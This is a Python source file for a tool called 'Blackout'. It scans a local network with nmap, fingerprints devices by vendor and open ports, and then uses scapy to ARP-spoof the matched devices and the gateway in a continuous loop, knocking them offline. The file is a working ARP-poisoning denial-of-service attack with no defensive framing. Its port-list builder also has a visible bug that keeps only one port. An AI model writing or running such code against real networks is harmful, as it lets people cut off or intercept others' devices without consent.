import nmap
import scapy.all as scapy
import time
import logging
import socket

logging.basicConfig(
    filename='blackout.log',
    level=logging.INFO,
    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)

logger = logging.getLogger('blackout')


class Blackout:
    def __init__(self, mode):
        self.mode = mode
        self.macdb = {}
        self.ports = self.get_ports()
        self.nm = nmap.PortScanner()
        self.deny_ips = []
        self.all_ips = []
        self.hosts = '192.168.1.0/24'
        self.devices = []

    def get_ports(self):
        portstr = ''
        for device in self.mode['devices']:
            dv = self.mode['devices'][device]
            for port in dv.services['tcp']:
                portstr=f'{port},'

        return portstr[:-1]

    def update_hosts(self, hosts):
        self.hosts = hosts

    def get_network_devices(self):
        print('Running network scan')
        self.devices = self.nm.scan('192.168.1.0/24', arguments='-sn')

    def detect_devices(self):
        for ip in self.devices['scan']:
            self.all_ips.append(ip)
            logger.info(f'Checking {ip}')
            print(f'Checking {ip}')
            device = self.devices['scan'][ip]
            try:
                mac = device['addresses']['mac']
                self.macdb[ip] = mac
            except KeyError:
                logger.warning('Mac grab failed, likely localhost. Skipping.')
                continue  # localhost, ignore.
            try:
                vendor = list(device['vendor'].values())[0]
            except:
                logger.warning('Could not get vendor for device')
                vendor = ''
            logger.info(f'Running port scan')
            scanning = True
            while scanning:
                try:
                    if self.ports != '':
                        services_raw = self.nm.scan(ip, ports=self.ports)
                        services = services_raw['scan'][ip]['tcp']
                    else:
                        services = []
                    logger.info(f'Scan complete')
                    scanning = False
                except Exception as e:
                    print(e)
                    logger.error('Error, retrying scan')

            for device_check in self.mode['devices']:
                if self.mode['devices'][device_check].match(vendor, services):
                    logger.info(f'Device matched! Adding to blacklist.')
                    self.deny_ips.append(
                        ip
                    )
                    break
                else:
                    logger.info(f'Device not in dictionary')

    def get_mac(self, ip):
        try:
            return self.macdb[ip]
        except KeyError:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
            self.macdb[ip] = answered_list[0][1].hwsrc
            return answered_list[0][1].hwsrc

    def get_local_ip(self):
        return socket.gethostbyname(socket.gethostname())

    def spoof(self, target, spoof):
        packet = scapy.ARP(op=1, pdst=target,
                           hwdst=self.get_mac(target),
                           psrc=spoof)

        scapy.send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=1, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False)

    def null_route_devices(self):
        gateway = '192.168.1.1'
        print(f'Null routing the following devices:')
        for item in self.deny_ips:
            print(item)
        print('\n\n')
        try:
            pkts = 0
            logger.info('Null Routing')
            while True:
                for target in self.deny_ips:
                    self.spoof(target, gateway)
                    self.spoof(gateway, target)
                    pkts+=1
                    print("\r[*] Packets Sent " + str(pkts), end="")
                time.sleep(0.1)
        except KeyboardInterrupt:
            for target in self.deny_ips:
                self.restore(gateway, target)
                self.restore(target, gateway)